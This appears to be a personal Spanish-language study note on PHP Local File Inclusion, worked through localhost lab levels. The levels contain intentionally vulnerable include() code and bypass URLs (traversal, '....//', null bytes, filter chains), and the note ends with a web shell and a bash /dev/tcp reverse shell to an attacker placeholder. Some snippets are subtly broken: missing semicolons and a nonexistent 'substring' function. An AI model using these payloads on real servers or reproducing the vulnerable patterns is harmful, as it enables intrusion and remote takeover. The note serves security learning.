> The Local File Inclusion (LFI) is a web vulnerability where an attacker tricks an application into including files from the server's local file system. This occurs due to improper sanitization of user input in functions like `include()`, allowing access to sensitive files (e.g., `/etc/passwd`) or execution of arbitrary code, such as by injecting malicious code into server logs.

## Herramientas
- apache2
- [[NecsecExplained]]

## Inyecciones
### Nivel 1
- Supongamos que hay una pagina web que muestra archivos mediante la url, por alli podemos inyectar una ruta para leer archivos internos del servidor como `/etc/passwd`
- Podemos armar un servidor simple con apache2 sirviendo un archivo `index.php`:
```php
<?php
        $filename = $_GET['filename'];
        include($filename);
?>
```
- Luego en la web podemos leer el passwd
`http://localhost/?filename=/etc/passwd`

### Nivel 2
- El desarrollador agrega una sanitizacion para asegurarse que estamos dentro de `/var/www/html`
```php
<?php
        $filename = $_GET['filename'];
        include('/var/www/html' . $filename);
?>
```
- Pero como podemos retroceder con `../` en la web podemos leer el passwd:
`http://localhost/?filename=../../../etc/passwd`

### Nivel 3
- Pues bueno si el problema es que puede retroceder, reemplacemos esos `../` con nada y listo
```php
<?php
        $filename = $_GET['filename'];
        $filename = str_replace('../', '', $filename)
        include('/var/www/html/' . $filename);
?>
```
- Luego en la web podemos ser redundantes para leer el passwd:
`http://localhost/?filename=....//....//....//....//etc/passwd`

### Nivel 4
- Podemos hacer que mediante una expresion regular un atacante no pueda acceder a un archivo con determinado nombre:
```php
<?php
        $filename = $_GET['filename'];
        $filename = str_replace('../', '', $filename)
        
        if(preg_match("/\/etc\/password/", $filename) == 1){
	        echo "[403 - Forbidden] Este archivo no se puede mostrar";
        } else {
	        include('/var/www/html/' . $filename);
        }
?>
```
- Luego en la web podemos modificar un poco la cadena `/etc/password` para que no coincida con el regex:
`http://localhost/?filename=....//....//....//....//etc///////passwd`
`http://localhost/?filename=....//....//....//....//etc////././//.///passwd`
`http://localhost/?filename=....//....//....//....//etc/./././passwd`
- Algunos ejemplos
- Otra variante es decirle que si los ultimos 6 caracteres (porque `passwd` tiene 6 caracteres nomas) son `== 'passwd'` entonces que no muestre los resultados
```php
<?php
        $filename = $_GET['filename'];
        $filename = str_replace('../', '', $filename)
        
        if (substring($filename, -6, 6) == "passwd"){
	        echo "[403 - Forbidden] Este archivo no se puede mostrar";
        } else {
	        include('/var/www/html/' . $filename);
        }
?> 
```
- Para burlarlo hay que agregar una `/`
`http://localhost/?filename=....//....//....//....//etc/passwd/.`

### Nivel 5
- Como desarrolladores entonces podemos agregar una extension obligatoria para que lea solo archivos `.php`:
```php
<?php
        $filename = $_GET['filename'];
        $filename = str_replace('../', '', $filename)
        
	    include('/var/www/html/' . $filename . '.php');
?>
```
- Para burlar esto podemos servirnos de una vulnerabilidad que tienen versiones de 5.2 para abajo de php con un caracter nulo `%00`, entonces seria como comentar el `.php`:
`http://localhost/?filename=....//....//....//....//etc/passwd%00`
- Con las versiones actuales de php esto no funciona ya.

### Nivel 6
- Utilizando el repo de [[NecsecExplained]] realizamos lo siguiente
`http://locahost:8081/course.php` - vemos el recurso desplegado
`http://localhost:8081/index.php?page=courses` - por lo tanto aplica .php al final de la cadena
`http://localhost:8081/index.php?page=/etc/passwd` - se coloca en el titulo pero no despliega nada, ni errores
`http://localhost:8081/index.php?page=/etc/passwd%00` - no accede tampoco

- Podemos modificar el archivo `index.php` en la linea donde se indica `include $page.'.php';` y eliminar el `.'php'` y listo, para facilitar lo siguiente
- Utilizando [[Wrappers]] explotaremos diferentes rutas y lecturas en texto plano de archivo .php.


### Nivel Dios
- [[BASE64]] tiene una caracteristica que dado un string `hola mundo` codificado en base64 `aG9sYSBtdW5kbw==`
- Pero si modificamos el string `!2>?><aG9sYSBtdW5kbw==` muestra los caracteres que se agrego pero la cadena se sigue leyendo `<>)_hola mundo`
- Conociendo esto entonces podemos inyectar letras delante de una string completamente inocente
- Detras no aniadimos caracteres porque se lee despues de lo habia antes, queremos siempre que nuestro comando se lea primero y comentar en todo caso lo que habia antes.
- Ahora pra inyectar esas letras extras utilizamos una codificacion llamada **Character Set “ISO-2022-KR”** o **CSISO2022KR** 
- Si aplicamos esa codificacion veremos que el string `DESKTOP-49VOC9L` se le aniaden caracteres delante `$)CDESKTOP-49VOC9L`
- Ahora esta cadena si la pasamos primero por base64, luego csiso2002kr, luego decodificamos con base64 y por ultimo codificamos en base64 de nuevo **aparece un caracter nuevo**. 
- Y es de esa forma que con un determinado cheatsheet podemos inyectar caracter por caracter delante de una cadena de texto.
`cadena ascii -> base64 -> csiso2022kr -> ascii -> base64` - por cada caracter a agregar

> [[PHP filter chain generator]]

## Ganar acceso a la maquina y obtener una terminal
- `<?php system($_GET['cmd'])?>`
- `url?cmd=bash -c "bash -i >& /dev/tcp/ipAtacante/4343 0>&1"`

